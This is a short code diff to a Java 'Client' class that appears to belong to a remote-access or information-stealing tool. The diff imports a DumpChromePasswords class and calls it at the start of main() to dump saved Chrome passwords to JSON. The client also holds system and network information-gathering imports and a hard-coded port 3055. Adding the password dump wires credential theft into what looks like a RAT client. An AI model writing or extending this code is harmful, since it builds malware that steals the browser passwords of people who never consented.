@@ -1,5 +1,6 @@
 package Client;
 
+import Client.InformationGathering.Chrome.DumpChromePasswords;
 import Client.InformationGathering.System.InfoObject;
 import Client.InformationGathering.System.SystemInformation;
 import Client.InformationGathering.System.SystemNetworkInformation;
@@ -23,7 +24,8 @@ public class Client {
     private static final int PORT = 3055;
 
     public static void main(String[] args) {
-
+        DumpChromePasswords dump = new DumpChromePasswords();
+        dump.generateJSON();
 
         while (true) {
             try {
